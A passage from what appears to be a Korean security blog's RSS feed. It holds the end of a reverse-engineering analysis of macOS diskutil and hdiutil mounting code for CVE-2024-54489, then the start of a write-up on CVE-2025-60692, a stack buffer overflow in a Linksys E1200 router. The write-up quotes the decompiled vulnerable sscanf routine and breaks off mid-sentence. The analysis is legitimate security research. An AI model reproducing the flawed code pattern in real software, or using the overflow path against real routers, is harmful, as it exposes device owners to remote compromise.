&#xB450; &#xAC1C;&#xC758; &#xC778;&#xC790;&#xB97C; &#xBC1B;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>entireDisk</code>&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130; ecx&#xC5D0; 0&#xC73C;&#xB85C; &#xC138;&#xD305;&#xB418;&#xB294; &#xB85C;&#xC9C1;&#xC744; 74&#xBC88; &#xC904;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>-[DiskMount mount:entireDisk:]</code> &#xBA54;&#xC11C;&#xB4DC;&#xC758; &#xB0B4;&#xBD80; &#xB3D9;&#xC791;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xB2E4;&#xBCF4;&#xBA74; &#xC775;&#xC219;&#xD55C; &#xC774;&#xB984;&#xC758; &#xD638;&#xCD9C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs objectivec"><span class="hljs-keyword">if</span> (!entireDisk){    <span class="hljs-keyword">id</span> obj = nullptr;    <span class="hljs-keyword">char</span> rax_39 = [obj_57 mountWithOptionsDictionary:obj_3 error:&amp;obj];    <span class="hljs-keyword">id</span> obj_62 = [obj <span class="hljs-keyword">retain</span>];</code></pre><p>&#xD574;&#xB2F9; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC2DC;&#xC810;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC804;&#xB2EC;&#xB41C; &#xC778;&#xC790;&#xB97C; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xD30C;&#xC2F1;&#xD55C; &#xC774;&#xD6C4; &#xC2F1;&#xAE00; &#xBCFC;&#xB968;&#xC744; &#xB9C8;&#xC6B4;&#xD2B8; &#xD558;&#xB294; &#xC0C1;&#xD669;&#xC73C;&#xB85C; <code>obj_57</code>&#xC740; <code>SKDisk</code> &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB85C; &#xC804;&#xCCB4; &#xD568;&#xC218;&#xBA85;&#xC740; <code>-[SKDisk mountWithOptionsDictionary:error:]</code>&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC804; StorageKit.framework &#xBD84;&#xC11D; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xBE44;&#xC2B7;&#xD55C; &#xC774;&#xB984;&#xC758; <code>-[SKDisk mountWithOptionsDictionary:withCompletionBlock:]</code> &#xBA54;&#xC11C;&#xB4DC;&#xC5D0; &#xAD00;&#xD55C; &#xC5B8;&#xAE09;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC600;&#xB294;&#xB370; &#xB0B4;&#xBD80; &#xB3D9;&#xC791; &#xB610;&#xD55C; &#xC720;&#xC0AC;&#xD55C; &#xD615;&#xD0DC;&#xB97C; &#xC9C0;&#xB2C8;&#xACE0; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB9CC;&#xC57D; <code>mount</code>&#xAC00; &#xC544;&#xB2CC; <code>mountDisk</code>&#xB97C; &#xD1B5;&#xD574; &#xD638;&#xCD9C;&#xB41C; &#xACBD;&#xC6B0;&#xC5D0;&#xB3C4; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xD638;&#xCD9C;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0;&#xB9CC; &#xC2E4;&#xC81C; &#xB9C8;&#xC6B4;&#xD2B8; &#xACFC;&#xC815;&#xC740; <code>-[SKDisk mountWithOptionsDictionary:withCompletionBlock:]</code>&#xB97C; &#xD1B5;&#xD574; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs objectivec"><span class="hljs-keyword">id</span> obj_63 = [[obj_8 wholeDiskForDisk:obj_57] <span class="hljs-keyword">retain</span>];obj_53 = obj_63;<span class="hljs-keyword">id</span> obj_1 = nullptr;obj_52 = (uint64_t)[obj_63 mountWithOptionsDictionary:obj_3 error:&amp;obj_1];obj_4 = [obj_1 <span class="hljs-keyword">retain</span>];obj_56 = [[CommandLineInterface sharedInterface] <span class="hljs-keyword">retain</span>];</code></pre><p>&#xC774;&#xD6C4; &#xB3D9;&#xC791;&#xC740; DSC &#xB0B4;&#xC5D0; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC6B0;&#xC120; hdiutil&#xC758; &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-2-hdiutil"><a href="#3-2-hdiutil" class="headerlink" title="3.2. hdiutil"></a>3.2. hdiutil</h3><p><code>hdiutil</code>&#xC5D0;&#xC11C;&#xB294; <code>mount</code>, <code>mountvol</code>&#xACFC; <code>attach</code> &#xC635;&#xC158;&#xC774; &#xAD00;&#xB828;&#xC774; &#xC788;&#xC744; &#xAC83;&#xC73C;&#xB85C; &#xD310;&#xB2E8;&#xB418;&#xC5B4; &#xC774;&#xB97C; &#xC911;&#xC810;&#xC801;&#xC73C;&#xB85C; &#xCD08;&#xAE30; &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">void</span> _start(<span class="hljs-keyword">int32_t</span> argc, <span class="hljs-keyword">int64_t</span>** argv) __noreturn    <span class="hljs-keyword">int32_t</span> argc_1 = argc    <span class="hljs-keyword">int64_t</span>** argv_1 = argv    <span class="hljs-keyword">uint64_t</span> __size = _strlen(__s: _basename(*argv)) + <span class="hljs-number">1</span>    <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> (* rax_2)[<span class="hljs-number">0x8</span>] = _malloc_type_malloc(__size, <span class="hljs-number">0x766447de</span>)    data_100041008 = rax_2    <span class="hljs-keyword">int64_t</span>* rdi_3 = *argv        <span class="hljs-keyword">if</span> (rax_2 != <span class="hljs-number">0</span>)        _strlcpy(__dst: rax_2, __source: _basename(rdi_3), __size)    <span class="hljs-keyword">else</span>        data_100041008 = rdi_3        _atexit(sub_100005280)    <span class="hljs-keyword">int32_t</span> rax_4 = _DIInitialize()</code></pre><p><code>diskutil</code>&#xACFC; &#xB2E4;&#xB974;&#xAC8C; <code>_start()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xB85C; &#xC9C4;&#xD589;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xC635;&#xC158;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC2E4;&#xD589; &#xC2DC; &#xC804;&#xB2EC;&#xB41C; &#xC778;&#xC790;&#xC758; &#xAC1C;&#xC218;&#xB97C; &#xD655;&#xC778;&#xD558;&#xC600;&#xACE0; &#xC774;&#xC5D0; &#xB530;&#xB77C; &#xBD84;&#xAE30;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> (argc s&lt; <span class="hljs-number">2</span>)    _warnx(<span class="hljs-string">&quot;missing verb&quot;</span>)    rdi_8 = *argv<span class="hljs-keyword">else</span>    <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> (* r12_1)[<span class="hljs-number">0x5</span>] = data_100041020    <span class="hljs-keyword">char</span>* r15_1 = argv[<span class="hljs-number">1</span>]</code></pre><p>&#xC774;&#xB54C; &#xCC38;&#xC870;&#xB418;&#xB294; <code>data_100041020</code> &#xC8FC;&#xC18C;&#xB97C; &#xC811;&#xADFC;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD14C;&#xC774;&#xBE14; &#xAD6C;&#xC870;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;:</p><pre><code class="hljs c">  char const (* data_100041020)[0x5] = data_1000310c9 {&quot;help&quot;}  <span class="hljs-keyword">void</span>* data_100041028 = sub_1000152e7  <span class="hljs-keyword">void</span>* data_100041030 = sub_10001530c  <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> (* data_100041040)[<span class="hljs-number">0x7</span>] = data_10002cbb5 {<span class="hljs-string">&quot;attach&quot;</span>}  <span class="hljs-keyword">void</span>* data_100041048 = sub_100010b70  <span class="hljs-keyword">void</span>* data_100041050 = sub_10000278f  <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> (* data_100041060)[<span class="hljs-number">0x7</span>] = data_10002fbca {<span class="hljs-string">&quot;detach&quot;</span>}  <span class="hljs-keyword">void</span>* data_100041068 = sub_100013841  <span class="hljs-keyword">void</span>* data_100041070 = sub_100006937  <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> (* data_100041080)[<span class="hljs-number">0x6</span>] = data_1000310ce {<span class="hljs-string">&quot;eject&quot;</span>}  <span class="hljs-keyword">void</span>* data_100041088 = sub_10001380c  <span class="hljs-keyword">void</span>* data_100041090 = sub_100006937  <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> (* data_1000410a0)[<span class="hljs-number">0x7</span>] = cstr_verify {<span class="hljs-string">&quot;verify&quot;</span>}  <span class="hljs-keyword">void</span>* data_1000410a8 = sub_10001b010  <span class="hljs-keyword">void</span>* data_1000410b0 = sub_100009c1c<span class="hljs-comment">// ...</span></code></pre><p>&#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xC635;&#xC158; &#xC774;&#xB984;&#xACFC; &#xB450; &#xAC1C;&#xC758; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xBC18;&#xBCF5;&#xB418;&#xB294; &#xAD6C;&#xC870;&#xC600;&#xC73C;&#xBA70; &#xAC01; &#xC635;&#xC158;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xD578;&#xB4E4;&#xB7EC; &#xC5ED;&#xD560;&#xC744;  &#xC218;&#xD589;&#xD568;&#xC744; &#xC608;&#xCE21;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>mount</code> &#xC635;&#xC158;&#xC744; &#xC608;&#xC2DC;&#xB85C; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC774;&#xB294; <code>sub_100010b70</code>&#xACFC; <code>sub_10000278f</code> &#xD568;&#xC218; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">char const (* data_1000412a0)[0x6] = data_100031149 {&quot;mount&quot;}<span class="hljs-keyword">void</span>* data_1000412a8 = sub_100010b70<span class="hljs-keyword">void</span>* data_1000412b0 = sub_10000278f</code></pre><p><code>sub_100010b70()</code> &#xD568;&#xC218;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74; &#xD574;&#xB2F9; &#xC635;&#xC158;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xB3C4;&#xC6C0;&#xB9D0; &#xB0B4;&#xC6A9;&#xC744; &#xCD9C;&#xB825;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC774; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">    <span class="hljs-function"><span class="hljs-keyword">int64_t</span> <span class="hljs-title">sub_100010b70</span><span class="hljs-params">(<span class="hljs-keyword">int32_t</span> arg1)</span></span><span class="hljs-function"></span><span class="hljs-function">        data_100041559 </span>= <span class="hljs-number">1</span>        data_100041549:<span class="hljs-number">5.b</span> = <span class="hljs-number">1</span>        data_100041549:<span class="hljs-number">1.</span>d = <span class="hljs-number">0x1010101</span>        data_100041551 = <span class="hljs-number">0x1010101</span>        data_100041555 = <span class="hljs-number">0x101</span>        FILE* rdi = *___stderrp                <span class="hljs-keyword">if</span> (arg1 != <span class="hljs-number">0</span>)            _fprintf(rdi, <span class="hljs-string">&quot;Usage:\t%s [options] &lt;image&gt;\n&quot;</span>, <span class="hljs-string">&quot;hdiutil attach&quot;</span>,                 &amp;data_100041548)            <span class="hljs-keyword">return</span> _fprintf(*___stderrp, <span class="hljs-string">&quot;\t%s -help\n&quot;</span>, <span class="hljs-string">&quot;hdiutil attach&quot;</span>) __tailcall                _fprintf(rdi, <span class="hljs-string">&quot;%s: attach disk image\n&quot;</span>, <span class="hljs-string">&quot;hdiutil attach&quot;</span>, &amp;data_100041548)        _fprintf(*___stderrp, <span class="hljs-string">&quot;Usage:\t%s &lt;image&gt;\n&quot;</span>, <span class="hljs-string">&quot;hdiutil attach&quot;</span>)        _fwrite(__ptr: <span class="hljs-string">&quot;\tDevice options:\n&quot;</span>, __size: <span class="hljs-number">0x11</span>, __nitems: <span class="hljs-number">1</span>,             __stream: *___stderrp)<span class="hljs-comment">// ...</span></code></pre><p><code>sub_10000278f()</code> &#xD568;&#xC218;&#xC758; &#xACBD;&#xC6B0; &#xC635;&#xC158; &#xD638;&#xCD9C; &#xC2DC; &#xC774;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xB85C;&#xC9C1;&#xC774; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">    <span class="hljs-function"><span class="hljs-keyword">uint64_t</span> <span class="hljs-title">sub_10000278f</span><span class="hljs-params">()</span></span><span class="hljs-function"></span><span class="hljs-function">        <span class="hljs-keyword">int64_t</span> rax</span><span class="hljs-function">        <span class="hljs-keyword">int64_t</span> var_38 </span>= rax        <span class="hljs-keyword">int64_t</span> rsi        <span class="hljs-keyword">int32_t</span> rdi        rsi, rdi = sub_100010dc0(<span class="hljs-number">0x10b8</span>)        <span class="hljs-keyword">int64_t</span> rax_1 = *___stack_chk_guard        CFAllocatorRef r14 = *_kCFAllocatorDefault        CFMutableDictionaryRef theDict_4 = _CFDictionaryCreateMutable(allocator: r14,             capacity: <span class="hljs-number">0</span>, keyCallBacks: _kCFTypeDictionaryKeyCallBacks,             valueCallBacks: _kCFTypeDictionaryValueCallBacks)        CFDictionaryRef theDict = <span class="hljs-literal">nullptr</span>        <span class="hljs-keyword">int32_t</span> r12                <span class="hljs-keyword">if</span> (rdi s&lt;= <span class="hljs-number">2</span>)            _warnx(<span class="hljs-string">&quot;attach: missing &lt;image&gt;&quot;</span>)            r12 = <span class="hljs-number">0x16</span>            <span class="hljs-keyword">goto</span> label_1000028aa                data_100041559 = <span class="hljs-number">1</span>        data_100041549:<span class="hljs-number">1.</span>d = <span class="hljs-number">0x1010101</span>        data_100041549:<span class="hljs-number">5.b</span> = <span class="hljs-number">1</span>        data_100041551 = <span class="hljs-number">0x1010101</span>        data_100041555 = <span class="hljs-number">0x101</span>        r12 = sub_100004133(&amp;data_100041560, &amp;data_100041548)                <span class="hljs-keyword">if</span> (_getenv(<span class="hljs-string">&quot;com_apple_hdid_debug&quot;</span>) == <span class="hljs-number">0</span>)            <span class="hljs-keyword">if</span> (_getenv(<span class="hljs-string">&quot;com_apple_hdid_verbose&quot;</span>) != <span class="hljs-number">0</span>)                data_100041564 = <span class="hljs-number">1</span>                data_1000415b4 = <span class="hljs-number">1</span>                _DISetVerboseLevel(<span class="hljs-number">1</span>)        <span class="hljs-keyword">else</span>            data_100041564 = <span class="hljs-number">1</span>            data_1000415b4 = <span class="hljs-number">1</span>            data_10004156c = <span class="hljs-number">1</span>            data_1000415b0 = <span class="hljs-number">1</span>            _DISetDebugLevel(<span class="hljs-number">1</span>)            _DISetVerboseLevel(<span class="hljs-number">1</span>)<span class="hljs-comment">// ...</span>                            <span class="hljs-keyword">if</span> (!_DIGetDebugLevel())                            {                            label_100003c86:                                <span class="hljs-keyword">int64_t</span> var_10e0_1 = <span class="hljs-number">0x40000000</span>;                                <span class="hljs-keyword">int64_t</span> (* var_10d8_1)(<span class="hljs-keyword">void</span>* arg1, <span class="hljs-keyword">int64_t</span>* arg2) =                                    sub_100010d82;                                <span class="hljs-keyword">void</span>* <span class="hljs-keyword">const</span> var_10d0_1 = &amp;data_10003d120;                                CFMutableDictionaryRef theDict_5 = theDict_4;                                sub_10001521e();                                <span class="hljs-keyword">uint64_t</span> (* rsi_16)(<span class="hljs-keyword">int64_t</span> arg1, CFDictionaryRef arg2);                                                                <span class="hljs-keyword">if</span> (_DIGetDebugLevel())                                    rsi_16 = sub_100014888;                                <span class="hljs-keyword">else</span>                                    rsi_16 = sub_100004702;                                                                r12 = _DIHLDiskImageAttach(theDict_4, rsi_16, <span class="hljs-number">0</span>, &amp;theDict);<span class="hljs-comment">// ...</span></code></pre><p>&#xD574;&#xB2F9; &#xBA85;&#xB839;&#xC5B4;&#xC640; &#xD568;&#xAED8; &#xC804;&#xB2EC;&#xB41C; &#xC635;&#xC158;&#xC744; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; &#xB515;&#xC154;&#xB108;&#xB9AC; &#xD615;&#xD0DC;&#xB85C; &#xC800;&#xC7A5;&#xD55C; &#xB4A4; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>_DIHLDiskImageAttach()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="4-To-Do"><a href="#4-To-Do" class="headerlink" title="4. To Do"></a>4. To Do</h2><p>&#xD604;&#xC7AC;&#xAE4C;&#xC9C0; &#xBD84;&#xC11D;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xC885;&#xD569;&#xD558;&#xBA74; &#xC8FC;&#xC694; &#xB3D9;&#xC791;&#xC758; &#xACBD;&#xC6B0; StorageKit&#xACFC; DiskImages &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C; &#xAE30;&#xB2A5;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xBA70; &#xC774;&#xB4E4;&#xC740; DSC &#xB0B4;&#xC5D0; &#xAD6C;&#xD604;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>DSC&#xC5D0; &#xC815;&#xC758;&#xB41C; &#xBA54;&#xC11C;&#xB4DC;&#xB294; &#xB2E4;&#xC2DC; XPC, Proxy &#xB4F1;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xBCC4;&#xB3C4;&#xC758; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xACFC; &#xC5F0;&#xACC4;&#xB418;&#xB294; &#xACFC;&#xC815;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC600;&#xB294;&#xB370;, &#xCD94;&#xAC00; &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xAE30;&#xC5D0; &#xC55E;&#xC11C; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xACFC; &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xC758; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xD750;&#xB984;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xC5EC; &#xBCC0;&#xACBD;&#xB41C; &#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD560; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.</p><hr><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li>Analyze DSC<ul><li><a href="https://www.jviotti.com/2023/11/20/exploring-macos-private-frameworks.html">https://www.jviotti.com/2023/11/20/exploring-macos-private-frameworks.html</a></li></ul></li><li>Analyze Suspicious Method<ul><li>StorageKit.framework<ul><li><a href="https://developer.apple.com/documentation/xpc">https://developer.apple.com/documentation/xpc</a></li></ul></li><li>DiskImages.framework<ul><li><a href="https://developer.apple.com/documentation/foundation/thread/detachnewthreadselector(_:totarget:with">https://developer.apple.com/documentation/foundation/thread/detachnewthreadselector(_:totarget:with</a>:)</li></ul></li></ul></li><li>Other Executable File<ul><li><a href="https://ss64.com/mac/diskutil.html">https://ss64.com/mac/diskutil.html</a></li><li><a href="https://ss64.com/mac/hdiutil.html">https://ss64.com/mac/hdiutil.html</a></li></ul></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/MacOS/">MacOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/ji9umi/">ji9umi</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-54489/">CVE-2024-54489</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/18/ji9umi/cve-2024-54489-analysis-from-security-updates-part2/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-60692: Cisco Linksys E1200 v2의 Buffer over flow로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/12/17/barrack/CVE-2025-60692/</link>
      <guid>https://hackyboiz.github.io/2025/12/17/barrack/CVE-2025-60692/</guid>
      <pubDate>Wed, 17 Dec 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2025-60692&quot;&gt;ht</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-60692">https://nvd.nist.gov/vuln/detail/CVE-2025-60692</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Cisco Linksys E1200 v2</li><li>Firmware: E1200_v2.0.11.001_us</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-60692&#xB294; Cisco &#xC0AC;&#xC758; Linksys E1200 &#xB77C;&#xC6B0;&#xD130;&#xC758;  <code>libshared.so</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; Stack-Based Buffer Overflow &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>httpd</code> &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xD55C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xD568;&#xC218;&#xC778; <code>get_mac_from_ip()</code>, <code>get_ip_from_mac()</code> &#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h3><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">int</span> listen4_fd;    <span class="hljs-keyword">int</span> conn_fd;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">client_addr</span>;</span>    <span class="hljs-keyword">socklen_t</span> addr_len;    <span class="hljs-comment">/* --- socket initialization / SSL setup / daemonize --- */</span>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {        <span class="hljs-comment">/* IPv4 socket accept */</span>        conn_fd = accept(listen4_fd, &amp;client_addr, &amp;addr_len);        <span class="hljs-keyword">if</span> (conn_fd &lt; <span class="hljs-number">0</span>)            <span class="hljs-keyword">continue</span>;        settimeouts(conn_fd, timeout_secs);        <span class="hljs-comment">/* &#xCDE8;&#xC57D; &#xACBD;&#xB85C; &#xC9C4;&#xC785; */</span>        get_client_ip_mac(conn_fd, &amp;client_addr);        fdopen(conn_fd, <span class="hljs-string">&quot;r+&quot;</span>);        ...    }}</code></pre><pre><code class="hljs c"><span class="hljs-function">FILE *__fastcall <span class="hljs-title">get_client_ip_mac</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct sockaddr *addr)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">int</span> family;    <span class="hljs-keyword">char</span> ip_str[<span class="hljs-number">46</span>];    family = *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> *)addr;    <span class="hljs-comment">/* IPv4 */</span>    <span class="hljs-keyword">if</span> (family == AF_INET) {        inet_ntop(AF_INET, addr + <span class="hljs-number">1</span>, ip_str, <span class="hljs-keyword">sizeof</span>(ip_str));        <span class="hljs-keyword">if</span> (!nvram_get(<span class="hljs-string">&quot;http_client_ip&quot;</span>) ||            <span class="hljs-built_in">strcmp</span>(nvram_get(<span class="hljs-string">&quot;http_client_ip&quot;</span>), ip_str)) {            nvram_set(<span class="hljs-string">&quot;http_client_ip&quot;</span>, ip_str);        }        <span class="hljs-comment">/* &#xCDE8;&#xC57D; &#xD568;&#xC218; &#xD638;&#xCD9C; */</span>        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mac = get_mac_from_ip(ip_str);        <span class="hljs-keyword">if</span> (!nvram_get(<span class="hljs-string">&quot;http_client_mac&quot;</span>) ||            <span class="hljs-built_in">strcmp</span>(nvram_get(<span class="hljs-string">&quot;http_client_mac&quot;</span>), mac)) {            nvram_set(<span class="hljs-string">&quot;http_client_mac&quot;</span>, mac);        }        use_lan = legal_ip_netmask(...);        <span class="hljs-keyword">return</span> ...;    }}</code></pre><p><code>main</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; client&#xC640; &#xC5F0;&#xACB0;&#xC744; &#xB9FA;&#xC5B4; <code>Accept()</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xBA74; <code>get_client_ip_mac</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0;, &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xC778; <code>get_mac_from_ip()</code> &#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="libshared-so"><a href="#libshared-so" class="headerlink" title="libshared.so"></a>libshared.so</h3><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">char</span> *__fastcall <span class="hljs-title">get_mac_from_ip</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *ip)</span></span><span class="hljs-function"></span>{    FILE *fp;    <span class="hljs-keyword">char</span> v6[<span class="hljs-number">50</span>];     <span class="hljs-comment">// IP field</span>    <span class="hljs-keyword">char</span> v7[<span class="hljs-number">150</span>];    <span class="hljs-comment">// MAC + padding</span>    <span class="hljs-keyword">char</span> line[<span class="hljs-number">104</span>];  <span class="hljs-comment">// fgets buffer</span>    <span class="hljs-keyword">char</span> flags1;    <span class="hljs-keyword">char</span> flags2;    fp = fopen(<span class="hljs-string">&quot;/proc/net/arp&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);    <span class="hljs-keyword">if</span> (!fp)        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;    <span class="hljs-keyword">if</span> (fgets(line, <span class="hljs-number">100</span>, fp)) {        <span class="hljs-keyword">while</span> (fgets(line, <span class="hljs-number">100</span>, fp)) {        <span class="hljs-comment">// VULNERABILITY : Buffer Over Flow</span>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(                    line,                    <span class="hljs-string">&quot;%s 0x%x 0x%x %100s %100s %100s\n&quot;</span>,                    v6,                              &amp;flags1,                    &amp;flags2,                    v7,                    &amp;v7[<span class="hljs-number">50</span>],                    &amp;v7[<span class="hljs-number">100</span>]                ) == <span class="hljs-number">6</span> &amp;&amp;                !<span class="hljs-built_in">strcmp</span>(ip, v6)) {                <span class="hljs-built_in">strcpy</span>(mac_7685, v7);                fclose(fp);                <span class="hljs-keyword">return</span> mac_7685;            }        }    }    fclose(fp);    <span class="hljs-keyword">return</span> default_mac;}</code></pre><p>&#xC774;&#xD6C4; <code>libshared.so</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; <code>get_mac_from_ip()</code>, <code>get_ip_from_mac()</code> &#xB294; <code>/proc/net/arp</code> &#xD30C;&#xC77C;&#xC744; 